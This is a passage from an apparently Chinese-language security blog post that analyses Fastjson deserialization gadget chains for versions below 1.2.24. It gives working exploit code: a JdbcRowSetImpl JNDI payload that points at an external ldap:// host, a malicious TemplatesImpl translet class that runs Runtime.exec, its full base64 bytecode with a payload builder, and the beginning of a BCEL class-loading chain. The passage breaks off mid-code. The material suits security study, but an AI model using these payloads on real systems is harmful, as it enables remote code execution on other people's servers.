System.out.println(jsonObject.getString(&quot;param1&quot;));</span></span><br><span class="line"><span class="comment">//        System.out.println(&quot;------------&quot;);</span></span><br><span class="line"><span class="comment">//        System.out.println(person.getName());</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">s3</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.y5neko.sec.fastjson.Person\&quot;,\&quot;age\&quot;:18,\&quot;name\&quot;:\&quot;abc\&quot;&#125;&quot;</span>;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object1</span> <span class="operator">=</span> JSON.parse(s3);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object2</span> <span class="operator">=</span> JSON.parseObject(s3, Person.class);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object3</span> <span class="operator">=</span> JSON.parseObject(s3);</span><br><span class="line">        System.out.println(<span class="string">&quot;-------------&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;object1:&quot;</span>);</span><br><span class="line">        System.out.println(object1);</span><br><span class="line">        System.out.println(<span class="string">&quot;-------------&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;object2:&quot;</span>);</span><br><span class="line">        System.out.println(object2);</span><br><span class="line">        System.out.println(<span class="string">&quot;-------------&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;object3:&quot;</span>);</span><br><span class="line">        System.out.println(object3);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231018205340468.png" alt="image-20231018205340468" style="zoom:80%;" />

<h4 id="特点"><a href="#特点" class="headerlink" title="特点"></a><strong>特点</strong></h4><ul>
<li><strong>FastJson不需要实现Serializable</strong></li>
<li><strong>不需要变量不是transient&#x2F;可控变量：</strong><ol>
<li>变量有对应的setter</li>
<li>或是public&#x2F;static</li>
<li>或满足条件的getter(返回值是)：</li>
</ol>
</li>
<li><strong>反序列化入口点不是readObject，而是setter或者是getter</strong></li>
<li><strong>执行点是相同的：反射或者类加载</strong></li>
</ul>
<h3 id="FastJson-1"><a href="#FastJson-1" class="headerlink" title="FastJson&lt;1.2.24"></a>FastJson&lt;1.2.24</h3><h4 id="JdbcRowSetImpl类-JNDI注入（出网）"><a href="#JdbcRowSetImpl类-JNDI注入（出网）" class="headerlink" title="JdbcRowSetImpl类+JNDI注入（出网）"></a><code>JdbcRowSetImpl</code>类+JNDI注入（出网）</h4><h5 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h5><p>首先我们找到一个JNDI注入</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231018210100036.png" alt="image-20231018210100036" style="zoom: 80%;" />

<p>可以看到调用了getDataSourceName方法，因此我们看一下<code>getDataSourceName</code>下面的参数可不可控，可以看到存在setter方法，所以可控</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231018211706006.png" alt="image-20231018211706006" style="zoom:80%;" />

<p>我们就要找一下对应的setter或者是符合条件的getter方法能够调用connect的方法</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231018211948085.png" alt="image-20231018211948085" style="zoom:80%;" />

<p>一共找到了三处，其中get并不满足要求，所以我们选择set</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231018212337541.png" alt="image-20231018212337541" style="zoom:80%;" />

<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231018212357408.png" alt="image-20231018212357408" style="zoom:80%;" />

<h5 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h5><p>现在我们来构造exp，用yakit开一个dnslog</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.y5neko.sec.fastjson;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">s3</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;DataSourceName\&quot;:\&quot;ldap://fastjson.eyutdtslkb.dgrh3.cn/rNMfFuPI\&quot;,\&quot;AutoCommit\&quot;:\&quot;false\&quot;&#125;&#125;&quot;</span>;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object1</span> <span class="operator">=</span> JSON.parse(s3);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object2</span> <span class="operator">=</span> JSON.parseObject(s3, Person.class);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object3</span> <span class="operator">=</span> JSON.parseObject(s3);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231018215930992.png" alt="image-20231018215930992" style="zoom:80%;" />

<p>说明反序列化利用成功，直接起一个JNDI反连</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231018220554695.png" alt="image-20231018220554695" style="zoom:80%;" />

<h5 id="限制"><a href="#限制" class="headerlink" title="限制"></a>限制</h5><p>因为需要反连，所以要求出网</p>
<h4 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a><code>TemplatesImpl</code></h4><p>基于TemplatesImpl类的利用链，该类会把_bytecodes属性的字节码内容加载并实例化</p>
<blockquote>
<p>PS：需要开启parse的Feature.SupportNonPublicField参数</p>
</blockquote>
<h5 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h5><p>首先我们来分析一下<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code></p>
<p>我们需要找到一个存在漏洞的getter或者setter，我们找到了这个方法<code>getOutputProperties()</code>，在parseObject反序列化时会调用</p>
<p>getOutputProperties内部调用了newTransformer()方法，而newTransformer()内部调用了getTransletInstance()方法获取Translet对象</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231019144409104.png" alt="image-20231019144409104" style="zoom:80%;" />

<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231019144531978.png" alt="image-20231019144531978" style="zoom:80%;" />

<p>继续跟进内部，其中通过defineTransletClasses获取字节码来生成返回的Translet对象</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231019145036151.png" alt="image-20231019145036151" style="zoom:80%;" />

<p>而defineTransletClasses方法则通过内部的私有变量_bytecodes生成返回的Translet对象</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231019145501432.png" alt="image-20231019145501432" style="zoom:80%;" />

<p>这里这个_bytecodes私有变量就是整个攻击设计的核心所在，虽然FastJson默认只能反序列化公有属性，但是可以在JSON串中指定_bytecodes为我们恶意攻击类的字节码，同时调用<code>JSON.parseObject(json, Object.class, Feature.SupportNonPublicField)</code>来反序列化私有属性，那么_bytecodes就可以是任意指定代码</p>
<p>也就是说，如果事先定义好了Translet返回Class类的内容，并且在自定义的Translet类的构造函数中实现攻击代码，并且把攻击代码转化成字节码，传入TemplatesImpl的私有变量_bytecodes中，那么反序列化生成TemplatesImpl时就会使用我们自定义的字节码来生成Translet类，从而触发Translet构造函数中的攻击代码</p>
<h5 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h5><p>首先构造一个恶意类，继承自AbstractTranslet类，因为时抽象类所以要实现其中的两个方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Copyright (c) 2023. Lorem ipsum dolor sit amet, consectetur adipiscing elit.</span></span><br><span class="line"><span class="comment"> * Morbi non lorem porttitor neque feugiat blandit. Ut vitae ipsum eget quam lacinia accumsan.</span></span><br><span class="line"><span class="comment"> * Etiam sed turpis ac ipsum condimentum fringilla. Maecenas magna.</span></span><br><span class="line"><span class="comment"> * Proin dapibus sapien vel ante. Aliquam erat volutpat. Pellentesque sagittis ligula eget metus.</span></span><br><span class="line"><span class="comment"> * Vestibulum commodo. Ut rhoncus gravida arcu.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.y5neko.sec.fastjson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TemplatesImplPayload</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.err.println(<span class="string">&quot;Success&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String[] cmd = &#123;<span class="string">&quot;calc&quot;</span>&#125;;</span><br><span class="line">            java.lang.Runtime.getRuntime().exec(cmd).waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> ( Exception e ) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM arg0, SerializationHandler[] arg1)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line">        <span class="comment">// anything</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM arg0, DTMAxisIterator arg1, SerializationHandler arg2)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line">        <span class="comment">// anything</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译成class文件后读取字节码，再转成base64</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yv66vgAAADQASwoADQAqCQArACwIAC0KAC4ALwcAMAgAMQoAMgAzCgAyADQKADUANgcANwoACgA4BwA5BwA6AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAC5MY29tL3k1bmVrby9zZWMvZmFzdGpzb24vVGVtcGxhdGVzSW1wbFBheWxvYWQ7AQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAEYXJnMAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEABGFyZzEBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwA7AQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAEYXJnMgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAIPGNsaW5pdD4BAANjbWQBABNbTGphdmEvbGFuZy9TdHJpbmc7AQABZQEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEADVN0YWNrTWFwVGFibGUHADcBAApTb3VyY2VGaWxlAQAZVGVtcGxhdGVzSW1wbFBheWxvYWQuamF2YQwADgAPBwA8DAA9AD4BAAdTdWNjZXNzBwA/DABAAEEBABBqYXZhL2xhbmcvU3RyaW5nAQAEY2FsYwcAQgwAQwBEDABFAEYHAEcMAEgASQEAE2phdmEvbGFuZy9FeGNlcHRpb24MAEoADwEALGNvbS95NW5la28vc2VjL2Zhc3Rqc29uL1RlbXBsYXRlc0ltcGxQYXlsb2FkAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEGphdmEvbGFuZy9TeXN0ZW0BAANlcnIBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACgoW0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAAd3YWl0Rm9yAQADKClJAQAPcHJpbnRTdGFja1RyYWNlACEADAANAAAAAAAEAAEADgAPAAEAEAAAAC8AAQABAAAABSq3AAGxAAAAAgARAAAABgABAAAAEQASAAAADAABAAAABQATABQAAAABABUAFgACABAAAAA/AAAAAwAAAAGxAAAAAgARAAAABgABAAAAHwASAAAAIAADAAAAAQATABQAAAAAAAEAFwAYAAEAAAABABkAGgACABsAAAAEAAEAHAABABUAHQACABAAAABJAAAABAAAAAGxAAAAAgARAAAABgABAAAAJAASAAAAKgAEAAAAAQATABQAAAAAAAEAFwAYAAEAAAABABkAHgACAAAAAQAfACAAAwAbAAAABAABABwACAAhAA8AAQAQAAAAhwAEAAEAAAAmsgACEgO2AAQEvQAFWQMSBlNLuAAHKrYACLYACVenAAhLKrYAC7EAAQAIAB0AIAAKAAMAEQAAAB4ABwAAABMACAAVABIAFgAdABkAIAAXACEAGAAlABoAEgAAABYAAgASAAsAIgAjAAAAIQAEACQAJQAAACYAAAAHAAJgBwAnBAABACgAAAACACk=</span><br></pre></td></tr></table></figure>

<p>把恶意类的字节码构造进json即可</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">package com.y5neko.sec.fastjson;</span><br><span class="line"></span><br><span class="line">import com.alibaba.fastjson.JSON;</span><br><span class="line">import com.alibaba.fastjson.parser.Feature;</span><br><span class="line">import com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"></span><br><span class="line">import javassist.ClassPool;</span><br><span class="line">import javassist.CtClass;</span><br><span class="line">import java.util.Base64;</span><br><span class="line"></span><br><span class="line">public class TemplatesImpl <span class="punctuation">&#123;</span></span><br><span class="line">    static String NASTY_CLASS = <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;</span><br><span class="line"></span><br><span class="line">    public static void main(String<span class="punctuation">[</span><span class="punctuation">]</span> args) throws Exception <span class="punctuation">&#123;</span></span><br><span class="line">        String TemplatesImplPayload = <span class="string">&quot;yv66vgAAADQASwoADQAqCQArACwIAC0KAC4ALwcAMAgAMQoAMgAzCgAyADQKADUANgcANwoACgA4BwA5BwA6AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAC5MY29tL3k1bmVrby9zZWMvZmFzdGpzb24vVGVtcGxhdGVzSW1wbFBheWxvYWQ7AQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAEYXJnMAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEABGFyZzEBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwA7AQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAEYXJnMgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAIPGNsaW5pdD4BAANjbWQBABNbTGphdmEvbGFuZy9TdHJpbmc7AQABZQEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEADVN0YWNrTWFwVGFibGUHADcBAApTb3VyY2VGaWxlAQAZVGVtcGxhdGVzSW1wbFBheWxvYWQuamF2YQwADgAPBwA8DAA9AD4BAAdTdWNjZXNzBwA/DABAAEEBABBqYXZhL2xhbmcvU3RyaW5nAQAEY2FsYwcAQgwAQwBEDABFAEYHAEcMAEgASQEAE2phdmEvbGFuZy9FeGNlcHRpb24MAEoADwEALGNvbS95NW5la28vc2VjL2Zhc3Rqc29uL1RlbXBsYXRlc0ltcGxQYXlsb2FkAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEGphdmEvbGFuZy9TeXN0ZW0BAANlcnIBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACgoW0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAAd3YWl0Rm9yAQADKClJAQAPcHJpbnRTdGFja1RyYWNlACEADAANAAAAAAAEAAEADgAPAAEAEAAAAC8AAQABAAAABSq3AAGxAAAAAgARAAAABgABAAAAEQASAAAADAABAAAABQATABQAAAABABUAFgACABAAAAA/AAAAAwAAAAGxAAAAAgARAAAABgABAAAAHwASAAAAIAADAAAAAQATABQAAAAAAAEAFwAYAAEAAAABABkAGgACABsAAAAEAAEAHAABABUAHQACABAAAABJAAAABAAAAAGxAAAAAgARAAAABgABAAAAJAASAAAAKgAEAAAAAQATABQAAAAAAAEAFwAYAAEAAAABABkAHgACAAAAAQAfACAAAwAbAAAABAABABwACAAhAA8AAQAQAAAAhwAEAAEAAAAmsgACEgO2AAQEvQAFWQMSBlNLuAAHKrYACLYACVenAAhLKrYAC7EAAQAIAB0AIAAKAAMAEQAAAB4ABwAAABMACAAVABIAFgAdABkAIAAXACEAGAAlABoAEgAAABYAAgASAAsAIgAjAAAAIQAEACQAJQAAACYAAAAHAAJgBwAnBAABACgAAAACACk=&quot;</span>;</span><br><span class="line"></span><br><span class="line">        String payload =</span><br><span class="line">                <span class="string">&quot;&#123;\&quot;&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;@type\&quot;:\&quot;&quot;</span> + NASTY_CLASS + <span class="string">&quot;\&quot;,&quot;</span> + <span class="string">&quot;\&quot;&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;_bytecodes\&quot;:[\&quot;&quot;</span> + TemplatesImplPayload + <span class="string">&quot;\&quot;],&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;&#x27;_name&#x27;:&#x27;asd&#x27;,&#x27;&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;_tfactory&#x27;:&#123; &#125;,\&quot;&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;_outputProperties\&quot;:&#123; &#125;,&quot;</span> + <span class="string">&quot;\&quot;&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;_version\&quot;:\&quot;1.0\&quot;,\&quot;&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;allowedProtocols\&quot;:\&quot;all\&quot;&#125;\n&quot;</span>;</span><br><span class="line">        System.out.println(payload);</span><br><span class="line">        ParserConfig config = new ParserConfig();</span><br><span class="line">        Object obj = JSON.parseObject(payload<span class="punctuation">,</span> Object.class<span class="punctuation">,</span> config<span class="punctuation">,</span> Feature.SupportNonPublicField);</span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>



<h4 id="FastJsonBcel类-动态类加载（不出网）"><a href="#FastJsonBcel类-动态类加载（不出网）" class="headerlink" title="FastJsonBcel类+动态类加载（不出网）"></a>FastJsonBcel类+动态类加载（不出网）</h4><h5 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h5><p>jdk的内置类中找到了这样一方法，能够进行动态类加载，就是ClassLoader里面的loadClass方法，在里面调用了defineClass：</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231023111904053.png" alt="image-20231023111904053" style="zoom:80%;" />

<p>我们可以看到，如果要调用defineClass方法，要保证clazz不为null，我们就需要调用前面的createClass方法</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231023120041498.png" alt="image-20231023120041498" style="zoom:80%;" />

<p>里面通过decode方法加载了字节码，因此payload中需要先进行一次encode编码，大致构造一下payload结构</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.y5neko.sec.fastjson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.util.ClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FastjsonBcel</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassLoader</span>();</span><br><span class="line">        <span class="type">byte</span>[] bytes = convert(<span class="string">&quot;H:\\Java_Project\\Java_Security\\out\\production\\Java_Security\\com\\y5neko\\sec\\fastjson\\TemplatesImplPayload.class&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> Utility.encode(bytes,<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//BCEL加载</span></span><br><span class="line">        classLoader.loadClass(<span class="string">&quot;$$BCEL$$&quot;</span> + code).newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] convert(String s) <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接下来我们考虑怎么调用loadClass方法，分析发现在tomcat包下面找到了一个BasicDataSource的类，里面的createConnectionFactory方法调用了forName方法，这里forName方法的底层逻辑其实调用了loadClass方法，所以如果我们让<strong>dirverClassLoader</strong>等于ClassLoader，让<strong>dirverClassName</strong>等于我们自己的恶意类，就可以执行。</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231023172802956.png" alt="image-20231023172802956" style="zoom:80%;" />

<p>恰好这两个变量还能够通过setter方法进行可控</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231023173818782.png" alt="image-20231023173818782" style="zoom:80%;" />

<p>接下来看哪里能够调用forName方法对应的createConnectionFactory方法</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231023174245749.png" alt="image-20231023174245749" style="zoom:80%;" />

<p>最后我们找到了createDataSource方法，继续分析用法，最终找到了getConnection方法</p>
<img src= "/img/friend_404.gif" data-lazy-src="/image/image-20231023174600624.png" alt="image-20231023174600624" style="zoom:80%;" />

<h5 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h5><p>根据上面的分析，我们大致可以构造一条调用流程</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.y5neko.sec.fastjson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.util.ClassLoader;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.dbcp.dbcp2.BasicDataSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> 